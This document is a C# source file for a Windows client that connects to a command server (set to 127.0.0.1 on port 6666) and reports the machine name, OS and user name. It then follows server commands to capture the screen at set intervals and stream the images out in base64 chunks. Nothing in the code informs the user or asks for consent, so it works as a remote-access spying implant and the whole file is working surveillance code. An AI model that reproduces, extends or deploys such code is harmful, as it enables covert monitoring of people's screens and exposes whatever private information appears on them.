using System;
using System.Net.Sockets;
using System.Text;
using Newtonsoft.Json;
using System.Timers;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Windows.Forms;
using System.Threading.Tasks;
using System.Collections.Generic;

class Program
{
    static TcpClient client;
    static NetworkStream stream;
    static readonly string Server = "127.0.0.1";
    static readonly int Port = 6666;
    static System.Timers.Timer screenshotTimer;
    static Queue<string> screenshotChunks = new Queue<string>();
    static int bufferSize = 1024 * 5;
    static bool isSendingScreenshot = false;  // Flag to control screenshot sending

    static void Main(string[] args)
    {
        string server = Server;
        int port = Port;

        try
        {
            client = new TcpClient(server, port);
            stream = client.GetStream();

            SendInfo();

            while (true)
            {
                byte[] data = new byte[bufferSize];
                int bytes = stream.Read(data, 0, data.Length);
                if (bytes == 0) break; // Server has closed connection
                string responseData = Encoding.UTF8.GetString(data, 0, bytes);
                dynamic responseJson = JsonConvert.DeserializeObject(responseData);

                if (responseJson.type == "message")
                {
                    Console.WriteLine("Received: {0}", responseJson.text);
                }
                else if (responseJson.type == "heartbeat")
                {
                    SendHeartbeatResponse();
                }
                else if (responseJson.type == "set_interval")
                {
                    SetIntervalAndStartSendingScreenshots((int)responseJson.interval);
                }
                else if (responseJson.type == "stop_screenshots")
                {
                    StopSendingScreenshots();
                }
            }
        }
        catch (Exception e)
        {
            Console.WriteLine("Exception: {0}", e);
        }
        finally
        {
            if (stream != null) stream.Close();
            if (client != null) client.Close();
        }
    }
    static string GetPC()
    {
        return Environment.MachineName;
    }
    static Tuple<string, string> GetOS()
    {
        return new Tuple<string, string>(Environment.OSVersion.ToString(), Environment.Is64BitOperatingSystem ? "64-bit" : "32-bit");
    }
    static string GetUser()
    {
        return Environment.UserName;
    }
    static void SendInfo()
    {
        var osInfo = GetOS();
        string pc = GetPC();
        string user = GetUser();

        string jsonOSInfo = JsonConvert.SerializeObject(new {
            type = "info",
            os = osInfo.Item1 + " " + osInfo.Item2,
            pc = pc,
            user = user
        });
        byte[] data = Encoding.UTF8.GetBytes(jsonOSInfo);
        stream.Write(data, 0, data.Length);
    }
    static void SendMessage(string message)
    {
        string jsonMessage = JsonConvert.SerializeObject(new {
            type = "message",
            text = message
        });
        byte[] data = Encoding.UTF8.GetBytes(jsonMessage);
        stream.Write(data, 0, data.Length);
    }
    static void SendHeartbeatResponse()
    {
        var heartbeatResponse = new
        {
            type = "heartbeat",
            text = "pong"
        };
        string jsonHeartbeatResponse = JsonConvert.SerializeObject(heartbeatResponse);
        byte[] heartbeatResponseBytes = Encoding.UTF8.GetBytes(jsonHeartbeatResponse);
        stream.Write(heartbeatResponseBytes, 0, heartbeatResponseBytes.Length);
    }
    static void SetIntervalAndStartSendingScreenshots(int interval)
    {
        screenshotTimer = new System.Timers.Timer(interval);
        screenshotTimer.Elapsed += (sender, e) => SendScreenshot();
        screenshotTimer.Start();
    }
    static void StopSendingScreenshots()
    {
        if (screenshotTimer != null)
        {
            screenshotTimer.Stop();
            screenshotTimer.Dispose();
            screenshotTimer = null;
            SendMessage("Stopped sending screenshots.");
        }
    }
    static void SendScreenshot()
    {
        if (isSendingScreenshot)
            return;

        isSendingScreenshot = true;
        screenshotChunks.Clear();  // Clear the queue before adding new chunks

        var screenshot = CaptureScreen();
        string base64Screenshot = Convert.ToBase64String(screenshot);
        int chunkSize = CalculateMaxChunkSize();  // Dynamically calculate the chunk size

        for (int i = 0; i < base64Screenshot.Length; i += chunkSize)
        {
            string chunk = base64Screenshot.Substring(i, Math.Min(chunkSize, base64Screenshot.Length - i));
            screenshotChunks.Enqueue(chunk);
        }
        SendNextScreenshotChunk();
    }
    static int CalculateMaxChunkSize()
    {
        var sampleMessage = new
        {
            type = "screenshot_chunk",
            data = "",
            final = false
        };
        string emptyJson = JsonConvert.SerializeObject(sampleMessage);
        int jsonOverhead = Encoding.UTF8.GetByteCount(emptyJson);
        int maxDataSize = bufferSize - jsonOverhead;  // Buffer limit minus JSON overhead
        return maxDataSize * 3 / 4;  // Base64 encodes 3 bytes into 4 characters, hence multiply by 3/4 to get byte count
    }
    static void SendNextScreenshotChunk()
    {
        if (screenshotChunks.Count > 0)
        {
            string chunk = screenshotChunks.Dequeue();
            bool isFinal = screenshotChunks.Count == 0;
            var screenshotMessage = new
            {
                type = "screenshot_chunk",
                data = chunk,
                final = isFinal
            };
            string jsonScreenshotMessage = JsonConvert.SerializeObject(screenshotMessage);
            byte[] screenshotData = Encoding.UTF8.GetBytes(jsonScreenshotMessage);
            stream.Write(screenshotData, 0, screenshotData.Length);

            if (!isFinal)
            {
                Task.Delay(10).ContinueWith(t => SendNextScreenshotChunk());
            }
            else
            {
                isSendingScreenshot = false;  // Reset the flag when the last chunk is sent
            }
        }
    }
    static byte[] CaptureScreen()
    {
        Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
        Graphics graphics = Graphics.FromImage(bitmap);
        graphics.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, bitmap.Size);
        using (MemoryStream memoryStream = new MemoryStream())
        {
            bitmap.Save(memoryStream, ImageFormat.Jpeg);
            return memoryStream.ToArray();
        }
    }
}